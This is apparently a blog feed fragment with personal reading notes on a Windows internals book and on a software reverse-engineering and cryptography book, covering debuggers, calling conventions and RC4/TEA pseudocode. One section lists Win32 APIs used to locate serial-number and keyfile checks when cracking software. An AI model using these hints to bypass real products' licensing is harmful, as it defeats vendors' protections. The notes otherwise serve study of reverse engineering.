Some people may call it <strong>ring -1</strong>, which is <strong>INACCURATE</strong>.</p><p>Four basic types of user-mode processes:</p><ul><li><strong>User processes</strong></li><li><strong>Service processes</strong></li><li><strong>System processes</strong></li><li><strong>Environment sybsystem server processes</strong></li></ul><p>Windows 10 Version 1607 includes a Windows Sybsystem for Linux (WSL) in beta state for developers only. However, this is not a true subsystem as described in this section.</p><p>Notice the Sybsystem DLLs blox below the Service Processes and User Processes boxes. Under Windows, user applications don’t call the native Windows OS services directly. Rather, they go through on or more <strong>subsystem dynamic-link libraries (DLLs)</strong>. The role of subsystem DLLs is to translate a documented function into the appropriate internal (and generally undocumented) native system service calls implemented mostly in <strong>Ntdll.dll</strong>.</p><p>The kernel-mode components of Windows include the following:</p><ul><li><strong>Executive</strong>: The Windows executive contains the base OS services, such as memory management, process and thread management, security, I/O, networking, and inter-process communication.</li><li><strong>The Windows kernel</strong></li><li><strong>Device drivers</strong>: This includes both hardware device drivers, and non-hardware device drivers.</li><li><strong>The Hardware Abstraction Layer (HAL)</strong></li><li><strong>The windowing and graphics system</strong></li><li><strong>The hypervisor layer</strong>: This is composed of the hypervisor itself. There are no drivers or other modules in this environment. The hypervisor is itself composed of multiple internal layers and services, such as its own memory manager, virtual processor scheduler, interrupt and timer management, synchronization routines, partitions, IPC and more.</li></ul><p>Core Windows System Files:</p><div class="table-container"><table><thead><tr><th>File Name</th><th>Components</th></tr></thead><tbody><tr><td>Ntoskrnl.exe</td><td>Executive and kernel</td></tr><tr><td>Hal.dll</td><td>HAL</td></tr><tr><td>Win32.sys</td><td>Kernel-mode part of the Windows subsystem (GUI)</td></tr><tr><td>Hvix64.exe (Intel), Hvax64.exe (AMD)</td><td>Hypervisor</td></tr><tr><td>.sys file in \SystemRoot\System32\Drivers</td><td>Core driver files, such as Direct X, Volume Manager, TCP/IP, TPM, andACPI supprot.</td></tr><tr><td>Ntdll.dll</td><td>Internal support functions and system service dispatch stubs to executive functions</td></tr><tr><td>Kernel32.dll, Advapi32.dll, User32.dll, Gdi32.dll</td><td>Core Windows subsystem DLLs.</td></tr></tbody></table></div><h3 id="Portability"><a href="#Portability" class="headerlink" title="Portability"></a>Portability</h3><p>Windows archives portability accross hardware architectures and platforms in two primary ways:</p><ul><li><strong>By using layered design</strong></li><li><strong>By using C</strong></li></ul><h3 id="Symmetric-multiprocessing"><a href="#Symmetric-multiprocessing" class="headerlink" title="Symmetric multiprocessing"></a>Symmetric multiprocessing</h3><p>Windows is a <strong>symmetric multiprocessing (SMP)</strong> OS. There is no master processor——the OS as well as user threads can be scheduled to run on any processor. Also, all the processors share just one memory space. This module contrasts with <strong>asymmetric multiprocessing (ASMP)</strong>, in which the OS typically selects one processor to execute OS kernel code while other processors run only user code.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.2.png'><img src="/images/books/WindowsInternal1/2.2.png" width="600"></p><p>Windows also supports four modern types of multiprocessor system: multicore, simultaneous multi-threaded (SMT), heterogeneous, and non-uniform memory access (NUMA).</p><h3 id="Scalability"><a href="#Scalability" class="headerlink" title="Scalability"></a>Scalability</h3><h3 id="Differences-between-client-and-server-versions"><a href="#Differences-between-client-and-server-versions" class="headerlink" title="Differences between client and server versions"></a>Differences between client and server versions</h3><h3 id="Checked-build"><a href="#Checked-build" class="headerlink" title="Checked build"></a>Checked build</h3><h2 id="Virtualization-based-security-architecture-overview"><a href="#Virtualization-based-security-architecture-overview" class="headerlink" title="Virtualization-based security architecture overview"></a>Virtualization-based security architecture overview</h2><p>The separation between user mode and kernel mode provides protection for the OS from user-mode code, whether malicious or not.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.3.png'><img src="/images/books/WindowsInternal1/2.3.png" width="600"></p><p>Here VBS stands for Virtualization-Based Security. VTL stands for Virtual Trust Levels.</p><p>The user/kernel code is running on top of a Hyper-V hypervisor. The difference is that with VBS enabled, a VTL of 1 is now present, which contains its own secure kernel running in the privileged processor mode (that is, ring 0 on x86/x64).</p><p>Similarly, a run-time user environment mode, called the Isolated User Mode (IUM), now exists, which runs in unprivileged mode (that is, ring 3).</p><h2 id="Key-system-components"><a href="#Key-system-components" class="headerlink" title="Key system components"></a>Key system components</h2><p>The role of an environment subsystem is to expose some subset of the base Windows executive system services to application programs.</p><p>User applications don’t call Windows system services directly. Instead, they go through one or more subsystem DLLs. These libraries export the documented interface that the programs linked to that subsystem can called.</p><h3 id="Executive"><a href="#Executive" class="headerlink" title="Executive"></a>Executive</h3><p>The executive includes the following types of functions:</p><ul><li><strong>Functions that are exported and callable from user mode</strong>: These functions are called system services and are exported via Ntdll.dll</li><li><strong>Device driver functions that are called through the DeviceIoControl function</strong></li><li><strong>Functions that can be called only from kernel mode that are exported and documented in the WDK</strong></li><li><strong>Functions that are defined as global symbols but are not exported</strong></li><li><strong>Functions that are internal to a module that are not defined as global symbols</strong></li></ul><h3 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h3><p>The kernel consists of a set of functions in <code>Ntoskrnl.exe</code> that provides fundamental mechanisms. THese include thread-scheduling and synchronization services, used by the executive components, and low-level hardware architecture——dependent support, such as interrupt and exception dispatching, which is different on each processor architecture.</p><p>The kernel provides a low-level based of well-defined, predictable OS primitives and mechanisms that allow higher-level components of the executive to do what they need to do.</p><h3 id="HAL"><a href="#HAL" class="headerlink" title="HAL"></a>HAL</h3><h3 id="Device-Drivers"><a href="#Device-Drivers" class="headerlink" title="Device Drivers"></a>Device Drivers</h3><h3 id="System-Processes"><a href="#System-Processes" class="headerlink" title="System Processes"></a>System Processes</h3><h1 id="Chapter-3-Processes-and-jobs"><a href="#Chapter-3-Processes-and-jobs" class="headerlink" title="Chapter 3 - Processes and jobs"></a>Chapter 3 - Processes and jobs</h1><ul><li>CreateProcess</li><li>CreateProcessAsUser: If a different token is required.</li><li>CreateProcessWithTokenW (advapi32.dll)</li><li>CreateProcessWithLogonW (advapi32.dll)</li><li>SlrCreateProcessWithLogon</li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/3.1.png'><img src="/images/books/WindowsInternal1/3.1.png" width="600"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Encrypting and Decrypting a Software</title>
    <link href="http://example.com/2026/01/23/2026-1-23-SoftwareCrypto/"/>
    <id>http://example.com/2026/01/23/2026-1-23-SoftwareCrypto/</id>
    <published>2026-01-22T16:47:22.000Z</published>
    <updated>2026-01-27T07:31:37.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/libro.jpg'><img src="/images/books/SoftwareCrypto/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Encrypting and Decrypting a Software”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>This book covers many topics and has almost 1,000 pages.</p><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.png'><img src="/images/meme/mika_nagisa_rollcake.png" width="300"></p><p>The book includes the following topics:</p><ul><li>Software cracking (patching and bypassing)</li><li>Mathematical cryptography (with formulas and expressions)</li><li>Software vulnerabilities (stack buffer overflow and heap buffer overflow)</li><li>Software packing, unpacking, and packer stubs</li><li>Reverse engineering</li></ul><p>Most of the topics focus on Windows rather than Linux.</p><p>Personally, I do not recommend this book for beginners in reverse engineering. Although the topics are broad, the book does not explore them in great depth. While the book introduces a wide range of topics, some of them could benefit from more detailed explanations, which may make the book less accessible to beginners.</p><p>There are several typos in the book, such as misusing the terms <em>byte</em> and <em>bit</em>, which was quite confusing.</p><p>The biggest drawback is that the example source code is very difficult to obtain for foreign readers. It would be excellent if the authors uploaded their source code to GitHub, similar to the author of <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/">Reverse Engineering Core</a>.</p><p>On the other hand, since the book covers many topics, it can be used as a reference or dictionary. In addition, it includes some topics that are rarely discussed in other books.</p><h1 id="Chapter-1-Fundamental-Knowledge"><a href="#Chapter-1-Fundamental-Knowledge" class="headerlink" title="Chapter 1 - Fundamental Knowledge"></a>Chapter 1 - Fundamental Knowledge</h1><h2 id="1-3-Windows-OS"><a href="#1-3-Windows-OS" class="headerlink" title="1.3 - Windows OS"></a>1.3 - Windows OS</h2><h3 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h3><ul><li>Kernel (kernel32.dll): Processes, threads, memory, file IO, etc.</li><li>User (user32.dll): Mouse click, keyboard input, window, menu, etc.</li><li>GDI (gdi32.dll): Display text.</li><li>advapi32.dll</li><li>comctl32.dll</li><li>comdlg32.dll</li><li>shell32.dll</li><li>netapi32.dll</li></ul><p>For Win32 API functions, “A” stands for ANSI. “W” stands for Widechars(Unicode).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int MessageBox(<br>    HWND hWnd,<br>    LPCTSTR lpText,<br>    LPCTSTR lpCaption,<br>    UINT uType<br>);<br></code></pre></td></tr></table></figure><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>WOW64 stands for <strong>Windows on Windows 64-bit</strong>.</p><h3 id="Windows-Message-Mechanism"><a href="#Windows-Message-Mechanism" class="headerlink" title="Windows Message Mechanism"></a>Windows Message Mechanism</h3><p><strong>SendMessage()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LRESULT SendMessage(<br>    HWND hWnd,<br>    UINT Msg,<br>    WPARAM wParam,<br>    LPARAM lParam<br>);<br></code></pre></td></tr></table></figure></p><p><strong>WM_COMMAND</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_COMMAND<br>    wNotifyCode = HIWORD(wParam);<br>    wID = LOWORD(wParam);<br>    hwndCtl = (HWND)lParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_GETTEXT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_GETTEXT<br>    wParam = (WPARAM)cchTextMax;<br>    lParam = (LPARAM)lpszText;<br></code></pre></td></tr></table></figure></p><p><strong>WM_QUIT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_QUIT<br>    nExitCode = (int)wParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_LBUTTONDOWN</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_LBUTTONDOWN<br>    fwKeys = wParam;<br>    xPos = LOWORD(lParam);<br>    yPos = HIWORD(lParam);<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><h1 id="Chapter-2-Dynamic-Analysis"><a href="#Chapter-2-Dynamic-Analysis" class="headerlink" title="Chapter 2 - Dynamic Analysis"></a>Chapter 2 - Dynamic Analysis</h1><h2 id="2-1-OllyDbg"><a href="#2-1-OllyDbg" class="headerlink" title="2.1 - OllyDbg"></a>2.1 - OllyDbg</h2><h3 id="BreakPoint"><a href="#BreakPoint" class="headerlink" title="BreakPoint"></a>BreakPoint</h3><ol><li>INT 3  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">004013A5 CC D0404000<br></code></pre></td></tr></table></figure>OllyDbg replaces the original instruction to <code>0xCC</code>. However, the original instruction in displayed.</li><li><p>Hardware BreakPoint<br>Hardware break points are implemented with <code>DRx</code> registers. The addresses of break points are stored into <code>DR0</code> ~ <code>DR3</code>, while <code>DR7</code> stores the status. Thus, the maximum number of hardware break points are is 4.</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.1.png'><img src="/images/books/SoftwareCrypto/2.1.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.2.png'><img src="/images/books/SoftwareCrypto/2.2.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.3.png'><img src="/images/books/SoftwareCrypto/2.3.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.4.png'><img src="/images/books/SoftwareCrypto/2.4.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.5.png'><img src="/images/books/SoftwareCrypto/2.5.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.6.png'><img src="/images/books/SoftwareCrypto/2.6.png" width="500"> </p></li><li><p>Memory BreakPoint</p><ol><li>On Access</li><li><p>On Write</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.7.png'><img src="/images/books/SoftwareCrypto/2.7.png" width="500"></p></li></ol></li><li><p>Set break-on-access</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.8.png'><img src="/images/books/SoftwareCrypto/2.8.png" width="500"> </p></li><li><p>Message BreakPoint</p><ol><li>View -&gt; Windows</li><li><p>Message breakpoint on ClassProc</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.9.png'><img src="/images/books/SoftwareCrypto/2.9.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.10.png'><img src="/images/books/SoftwareCrypto/2.10.png" width="500"></p></li></ol></li><li><p>Conditional BreakPoint</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.11.png'><img src="/images/books/SoftwareCrypto/2.11.png" width="500"> <figcaption> Shift+F2 </figcaption> </p></li><li>Conditional Log</li></ol><h2 id="2-3-MDebug"><a href="#2-3-MDebug" class="headerlink" title="2.3 - MDebug"></a>2.3 - MDebug</h2><h2 id="2-4-WinDbg"><a href="#2-4-WinDbg" class="headerlink" title="2.4 - WinDbg"></a>2.4 - WinDbg</h2><h1 id="Chapter-3-Static-Analysis"><a href="#Chapter-3-Static-Analysis" class="headerlink" title="Chapter 3 - Static Analysis"></a>Chapter 3 - Static Analysis</h1><h2 id="3-2-Disassembly-Engine"><a href="#3-2-Disassembly-Engine" class="headerlink" title="3.2 - Disassembly Engine"></a>3.2 - Disassembly Engine</h2><ol><li>ODDisasm</li><li>BeaEngine</li><li>Udis86</li><li>Capstone</li><li>AsmJit</li><li>Keystone</li></ol><h2 id="3-3-Static-Disassembly"><a href="#3-3-Static-Disassembly" class="headerlink" title="3.3 - Static Disassembly"></a>3.3 - Static Disassembly</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.1.png'><img src="/images/books/SoftwareCrypto/3.1.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.2.png'><img src="/images/books/SoftwareCrypto/3.2.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.3.png'><img src="/images/books/SoftwareCrypto/3.3.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.4.png'><img src="/images/books/SoftwareCrypto/3.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.5.png'><img src="/images/books/SoftwareCrypto/3.5.png" width="700"></p><h3 id="Hexadecimal-Tools"><a href="#Hexadecimal-Tools" class="headerlink" title="Hexadecimal Tools"></a>Hexadecimal Tools</h3><ul><li>HexWorkship</li><li>WinHex</li><li>Hiew</li></ul><h1 id="Chapter-4-Reverse-Engineering-Techniques"><a href="#Chapter-4-Reverse-Engineering-Techniques" class="headerlink" title="Chapter 4 - Reverse Engineering Techniques"></a>Chapter 4 - Reverse Engineering Techniques</h1><h2 id="4-1-Reverse-Engineering-on-x32-Platform"><a href="#4-1-Reverse-Engineering-on-x32-Platform" class="headerlink" title="4.1 - Reverse Engineering on x32 Platform"></a>4.1 - Reverse Engineering on x32 Platform</h2><h3 id="Calling-Convention"><a href="#Calling-Convention" class="headerlink" title="Calling Convention"></a>Calling Convention</h3><p>Example1:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test1(p1, p2, p3);<br></code></pre></td></tr></table></figure></p><p><strong>__cdecl</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1<br>add esp,0C  ; stack cleanup<br></code></pre></td></tr></table></figure></p><p><strong>pascal</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p1     ; left to right<br>push p2<br>push p3<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><hr><p>Example2:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test2(p1, p2);<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2                         ; Parameter 2<br>push p1                         ; Parameter 1<br>call test2<br>&#123;<br>    push ebp                    ; Original EBP pointer<br>    mov ebp, esp                ; New EBP pointer<br>    mov eax, dword ptr[ebp+0C]  ; Parameter 2<br>    mov ebx, dword ptr[ebp+08]  ; Parameter 1<br>    sub esp, 8                  ; Reserve space for local variables<br><br>    ...<br><br>    add esp, 8                  ; Release space of local variables<br>    pop ebp                     ; Original EBP pointer<br>    ret 8                       ; return (Equal to ret # add esp, 8)<br>                                ; 2 (Parameter) x 4h = 8<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>enter: push ebp # mov ebp,esp # sub esp, xxx</li><li>leave: add esp, xxx # pop ebp</li></ul><p>We can rewrite the script above<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enter xxxx, 0   ; Reserver space xxxx for local variable<br><br>...<br><br>leave<br>ret 8<br></code></pre></td></tr></table></figure></p><hr><p>Enable <strong>Maximum Speed</strong> in VC6.0<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2<br>push p1<br>call test2<br>&#123;<br>    mov eax, dword ptr [esp+04]     ; Call parameter 1<br>    mov ecx, dword ptr [esp+08]     ; Call parameter 2<br><br>    ...<br><br>    ret 8                           ; return<br>&#125;<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Function"><a href="#Virtual-Function" class="headerlink" title="Virtual Function"></a>Virtual Function</h3><h1 id="Chapter-5-Software-Protection-Demonstration"><a href="#Chapter-5-Software-Protection-Demonstration" class="headerlink" title="Chapter 5 - Software Protection Demonstration"></a>Chapter 5 - Software Protection Demonstration</h1><h2 id="5-1-Serial-Number-and-KeyGen"><a href="#5-1-Serial-Number-and-KeyGen" class="headerlink" title="5.1 - Serial Number and KeyGen"></a>5.1 - Serial Number and KeyGen</h2><ol><li><script type="math/tex; mode=display"> \text{Serial Number} = F(\text{Username})</script></li><li><script type="math/tex; mode=display">\text{Username} = F^{-1}(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> F_1(\text{Username}) = F_2(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> Some value = F(\text{Username}, \text{Serial Number})</script></li></ol><h3 id="Exploiting-Serial-Number-Protection-Mechanism"><a href="#Exploiting-Serial-Number-Protection-Mechanism" class="headerlink" title="Exploiting Serial Number Protection Mechanism"></a>Exploiting Serial Number Protection Mechanism</h3><p>Commonly used API functions for Serial Number Protection:</p><ol><li>The following functions are commonly used for input:<ul><li>GetWindowTextA(W)</li><li>GetDlgItemTextA(W)</li><li>GetDlgItemInt</li><li>hmencpy (Windows 9x/Me only)</li></ul></li><li>The floowing functions are commonly used for messagebox:<ul><li>MessageBoxA(W)</li><li>MessageBoxExA(W)</li><li>ShowWindow</li><li>MessageBoxIndirectA(W)</li><li>CreateDialogParamA(W)</li><li>CreateDialogIndirectParamA(W)</li><li>DialogBoxParamA(W)</li><li>DialogBoxIndirectParamA(W)</li></ul></li><li>Other functions:<ol><li>Serial number might be stored in registry:<ul><li>RegQueryValueExA(W)</li></ul></li><li>Serial number might be stored in an INI file:<ul><li>GetPrivateProfileStringA(W)</li><li>GetPrivateProfileIntA(W)</li><li>GetProfileStringA(W)</li><li>GetProfileIntA(W)</li></ul></li><li>Serial number might be stored in other file:<ul><li>CreateFileA(W)</li><li>_lopen()</li></ul></li></ol></li></ol><h3 id="KeyFile-Protection"><a href="#KeyFile-Protection" class="headerlink" title="KeyFile Protection"></a>KeyFile Protection</h3><div class="table-container"><table><thead><tr><th>API Function</th><th>Description</th></tr></thead><tbody><tr><td>FindFirstFileA</td></tr><tr><td>CreateFileA, _lopen</td></tr><tr><td>GetFileSize, GetFileSizeEx</td></tr><tr><td>GetFileAttributesA, GetFileAttributesExA</td></tr><tr><td>SetFilePointer, SetFilePointerEx</td><td>Mov</td></tr><tr><td>ReadFile</td><td>Obtain file content.</td></tr></tbody></table></div><h2 id="5-7-Disk-Protection"><a href="#5-7-Disk-Protection" class="headerlink" title="5.7 - Disk Protection"></a>5.7 - Disk Protection</h2><h2 id="5-8-Single-Instance"><a href="#5-8-Single-Instance" class="headerlink" title="5.8 - Single Instance"></a>5.8 - Single Instance</h2><h1 id="Chapter-6-Cryptography-Algorithm"><a href="#Chapter-6-Cryptography-Algorithm" class="headerlink" title="Chapter 6 - Cryptography Algorithm"></a>Chapter 6 - Cryptography Algorithm</h1><h2 id="6-1-Hashing"><a href="#6-1-Hashing" class="headerlink" title="6.1 - Hashing"></a>6.1 - Hashing</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5 stands for <strong>Message Digest Algorithm 5</strong>.</p><script type="math/tex; mode=display">A = 01234567h\\B = 89abcdefh\\C = fedcba98h\\D = 76543210h\\</script><script type="math/tex; mode=display">\begin{align*}F(X,Y,Z) &= (X\&Y) | ((\sim X)\&Z)\\G(X,Y,Z) &= (X\&Z) | (Y\&(\sim Z))\\H(X,Y,Z) &= X\text{\textasciicircum}Y\text{\textasciicircum}Z\\I(X,Y,Z) &= Y\text{\textasciicircum}(X|(\sim Z))\end{align*}</script><h3 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h3><p>SHA stands for <strong>Secure Hash Algorithm</strong>.</p><ul><li>SHA-1</li><li>SHA-256</li><li>SHA-384</li><li>SHA-512</li></ul><h2 id="6-2-Symmetric-Encryption"><a href="#6-2-Symmetric-Encryption" class="headerlink" title="6.2 - Symmetric Encryption"></a>6.2 - Symmetric Encryption</h2><ul><li>DES (Data Encryption Standard)</li><li>IDEA (International Data Encryption Algorithm)</li><li>AES (Advanced Encryption Standard)</li><li>BlowFish</li><li>TwoFish</li></ul><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4 stands for <strong>Rivest Cipher 4</strong>.</p><p><strong>KSA (Key-Scheduling Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-KSA(Key)<br>    for i := 0 to 255 do<br>        S[i] := i<br>    end for<br><br>    j := 0<br>    for i := 0 to 255 do<br>        j := (j + S[i] + Key[i mod keylength]) mod 256<br>        swap S[i] and S[j]<br>    end for<br><br>    return S<br><br></code></pre></td></tr></table></figure></p><p><strong>PRGA (Pseudo-Random Generation Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-PRGA(S)<br>    i := 0<br>    j := 0<br><br>    while true do<br>        i := (i + 1) mod 256<br>        j := (j + S[i]) mod 256<br>        swap S[i] and S[j]<br>        t := (S[i] + S[j]) mod 256<br>        K := S[t]<br>        output K<br>    end while<br></code></pre></td></tr></table></figure></p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p>TEA stands for <strong>Tiny Encryption Algorithm</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Encrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 sum = 0;<br>    uint32 delta = 0x9E3779B9;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        v1 += ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Decrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 delta = 0x9E3779B9;<br>    uint32 sum = delta * 32;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        sum -= delta;<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><p>Where:</p><script type="math/tex; mode=display">\begin{align*}delta &= \frac{\sqrt{5} - 1}{2} \times 2^{32}\\&= (\sqrt{5} - 1) \times 2^{31}\end{align*}</script><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><h3 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a>BlowFish</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h1 